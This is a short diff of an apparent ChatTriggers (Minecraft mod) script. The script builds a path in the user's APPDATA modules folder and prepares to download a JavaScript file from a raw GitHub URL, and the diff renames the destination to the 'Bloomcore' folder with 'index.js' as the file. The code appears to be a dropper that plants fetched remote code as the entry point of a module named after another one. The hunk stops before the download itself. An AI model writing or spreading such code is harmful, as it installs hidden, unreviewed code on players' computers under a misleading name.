@@ -4,10 +4,10 @@ const System = Java.type('java.lang.System');
 
 try {
     const appData = System.getenv("APPDATA");
-    const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Amaterasu");
+    const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Bloomcore");
     targetPath.mkdirs();
 
-    const file = new File(targetPath, "script.js");
+    const file = new File(targetPath, "index.js");
 
     const url = "https://raw.githubusercontent.com/satnnyy/test1/main/b.js";
     ChatLib.chat("§a[+] Downloading file...");
